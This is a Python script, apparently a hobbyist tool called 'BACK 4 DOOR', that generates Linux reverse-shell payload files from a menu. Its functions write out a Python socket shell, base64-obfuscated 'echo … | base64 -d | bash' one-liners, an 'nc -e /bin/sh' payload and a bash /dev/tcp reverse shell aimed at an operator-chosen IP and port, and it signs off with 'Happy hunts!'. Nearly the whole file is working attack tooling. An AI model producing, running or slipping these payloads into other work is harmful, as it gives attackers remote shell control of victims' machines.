from colorama import *
from pyfiglet import Figlet
import base64

init(autoreset=True)
f = Figlet(font='slant')
print(Fore.BLUE+f.renderText('BACK 4 DOOR'))
panel = Fore.YELLOW + """
[0]: exit
[1]: method 1(multi line, python3 script, no base64 encode)["Linux"]
[2]: method 2(one line, bash script, have a base64 encode)["Linux"]
[3]: method 3(netcat one line, bash script, have a base64 encode)["Linux"]
[4]: modul is need repair
[5]: method 5(one line, bash scrip, no base64)["Linux"]
[99]: exit
"""


def sec1(host, sock, file):
    # name ve ip string port int
    file1 = open(file + ".py", "w")
    file1.write("#!/usr/bin/python3\n")
    file1.write("from os import dup2\n")
    file1.write("from subprocess import run\n")
    file1.write("import socket\n")
    file1.write("s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n")
    file1.write(f"s.connect(('{host}',{sock}))\n")
    file1.write("dup2(s.fileno(),0)\n")
    file1.write("dup2(s.fileno(),1)\n")
    file1.write("dup2(s.fileno(),2)\n")
    file1.write("run(['/bin/bash','-i'])")
    file1.close()
    print(Fore.WHITE + "ip: " + Fore.CYAN + ip)
    print(Fore.WHITE + "port: " + Fore.CYAN + str(port))
    print(Fore.YELLOW + "File saved: " + Fore.RED + name + ".py")
    print(Fore.RED + "Happy hunts!")
    exit()

def sec2(host1, socket1, names1):
    # base64 yap
    st = f"""python3 -c 'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host1}",{socket1})); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);run(["/bin/bash","-i"]);'"""
    encodedBytes = base64.b64encode(st.encode("utf-8"))
    encodedStr = str(encodedBytes, "utf-8")
    wrt = encodedStr
    file2 = open(names1 + ".sh", "w")
    file2.write("echo " + wrt + " | base64 -d | bash -")
    file2.close()
    print(Fore.WHITE + "ip: " + Fore.CYAN + host1)
    print(Fore.WHITE + "port: " + Fore.CYAN + str(socket1))
    print(Fore.YELLOW + "File saved: " + Fore.RED + names1 + ".sh")
    print(Fore.RED + "Happy hunts!")
    exit()


def sec3(host2, sock2, name2):
    # "nc -e /bin/sh IP 80"
    file3 = open(name2 + ".sh", "w")
    std = "nc -e /bin/sh {} {}".format(host2, sock2)
    encodedBytes1 = base64.b64encode(std.encode("utf-8"))
    encodedStr1 = str(encodedBytes1, "utf-8")
    wrt1 = encodedStr1
    file3.write("echo " + wrt1 + " | base64 -d | bash -")
    file3.close()
    print(Fore.WHITE + "ip: " + Fore.CYAN + host2)
    print(Fore.WHITE + "port: " + Fore.CYAN + str(sock2))
    print(Fore.YELLOW + "File saved: " + Fore.RED + name2 + ".sh")
    print(Fore.RED + "Happy hunts!")
    exit()


def sec4(host4, sock4, name4):
    file4 = open(name4+".sh", "w")
    strr = "/bin/sh | nc {} {}".format(host4, sock4)
    file4.write(strr)
    # "/bin/sh | nc IP 30" 'çalışamaz gibi'
    file4.close()
    print(Fore.WHITE + "ip: " + Fore.CYAN + host4)
    print(Fore.WHITE + "port: " + Fore.CYAN + str(sock4))
    print(Fore.YELLOW + "File saved: " + Fore.RED + name4 + ".sh")
    print(Fore.RED + "Happy hunts!")
    exit()


def sec5(host5, sock5, name5):
    sec_5 = f"bash -c 'bash -i >/dev/tcp/{host5}/{sock5} 0>&1'"
    file5 = open(name5+".sh",  "w")
    file5.write(sec_5)
    file5.close()
    print(Fore.WHITE + "ip: " + Fore.CYAN + host5)
    print(Fore.WHITE + "port: " + Fore.CYAN + str(sock5))
    print(Fore.YELLOW + "File saved: " + Fore.RED + name5 + ".sh")
    print(Fore.RED + "Happy hunts!")
    exit()


while True:
    print(panel)
    sh_a = Fore.BLUE + ":>>" + Fore.WHITE + " "
    sh = input(sh_a)
    if sh == "0":
        exit()
    elif sh == "99":
        exit()
    elif sh == "1":
        name = input("Name: ")
        name = str(name)
        ip = input("ip: ")
        ip = str(ip)
        port = input("port: ")
        port = int(port)
        sec1(ip, port, name)
    elif sh == "2":
        name1 = input("Name: ")
        name1 = str(name1)
        ip1 = input("ip: ")
        ip1 = str(ip1)
        port1 = input("port: ")
        port1 = int(port1)
        sec2(ip1, port1, name1)
    elif sh == "3":
        name2 = input("Name: ")
        name2 = str(name2)
        ip2 = input("ip: ")
        ip2 = str(ip2)
        port2 = input("port: ")
        port2 = int(port2)
        sec3(ip2, port2, name2)
    elif sh == "4":
        print("Coming soon")
    elif sh == "5":
        names5 = input("Name: ")
        names5 = str(names5)
        ip5 = input("ip: ")
        ip5 = str(ip5)
        port5 = input("port: ")
        sec5(ip5, port5, names5)
